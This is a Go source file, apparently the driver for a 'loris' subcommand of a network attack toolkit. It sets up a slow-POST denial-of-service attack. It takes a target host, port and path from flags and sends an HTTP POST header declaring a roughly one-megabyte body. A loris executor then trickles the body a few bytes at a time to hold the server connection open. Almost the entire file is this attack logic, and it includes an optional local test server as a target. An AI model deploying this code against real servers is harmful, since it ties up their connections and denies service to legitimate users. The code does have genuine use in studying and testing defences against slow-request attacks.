package loris

import (
	"flag"
	"github.com/andrewflbarnes/snacks/internal/helper"
	"github.com/andrewflbarnes/snacks/pkg/http"
	"github.com/andrewflbarnes/snacks/pkg/loris"
	log "github.com/sirupsen/logrus"
	"os"
	"strconv"
)

var (
	logger = log.WithFields(log.Fields{})

	flagsLoris = flag.NewFlagSet("loris", flag.ExitOnError)
	flagTest   = flagsLoris.Bool("test", false, "Runs an embedded server to connect to")
	flagHost   = flagsLoris.String("host", "localhost", "The host to send the payload to")
	flagPath   = flagsLoris.String("path", "/", "The path to send the request to")
	flagPort   = flagsLoris.Int("port", 80, "The port to send the payload to")
	flagSize   = flagsLoris.Int("size", 1_000_000, "The size of the request payload to send")
	flagDelay  = flagsLoris.Int("sd", 50, "The delay in ms between each send")
	flagBytes  = flagsLoris.Int("sb", 5, "The number of bytes to send in each send")
)

func Loris() {
	logFlags := helper.InitLogFlags(flagsLoris)
	flagsLoris.Parse(os.Args[2:])
	logFlags.Apply()

	host := *flagHost
	port := *flagPort
	test := *flagTest
	size := *flagSize
	sendBytes := *flagBytes
	sendDelay := *flagDelay

	logger.Info("Starting")

	// Create a new loris instance
	sendStrategy := loris.NewFixedByteSendStrategy(sendBytes, sendDelay)
	l := loris.NewLoris(sendStrategy)

	if test {
		// Start a server which will receive the payload
		serverReady := make(chan bool)
		go helper.HttpServer(port, serverReady)
		<-serverReady
	}

	conn, err := helper.DialTcp(host, port)
	if err != nil {
		logger.WithFields(log.Fields{
			"host": host,
			"port": port,
		}).Fatal("Unable to establish connection")
	}

	prefix := getPayloadPrefix()

	logger.WithFields(log.Fields{
		"connection": conn.RemoteAddr().String(),
		"prefix":     string(prefix),
		"size":       size,
	}).Debug("Executing attack")
	done := l.Execute(conn, prefix, size)

	// Wait for the payload to finish sending
	<-done
}

func getPayloadPrefix() []byte {
	// if http...
	return getHttpPayload(http.Post, helper.ApplicationJsonPrefix)
}

func getHttpPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
	host := *flagHost
	port := *flagPort
	size := *flagSize
	endpoint := *flagPath

	contentTypePrefix := media.Prefix()
	contentTypePrefixLen := len(contentTypePrefix)

	headers := map[string]string{
		"Content-Type":   media.Name(),
		"Accept":         "*/*",
		"Content-Length": strconv.Itoa(size + contentTypePrefixLen),
		"Host":           host + ":" + strconv.Itoa(port),
	}

	builder := http.HttpRequestBuilder{
		Proto:    http.Http11,
		Verb:     verb,
		Endpoint: endpoint,
		Body:     "",
		Headers:  headers,
	}

	httpRequest := builder.BuildBytes()
	return append(httpRequest, contentTypePrefix...)
}
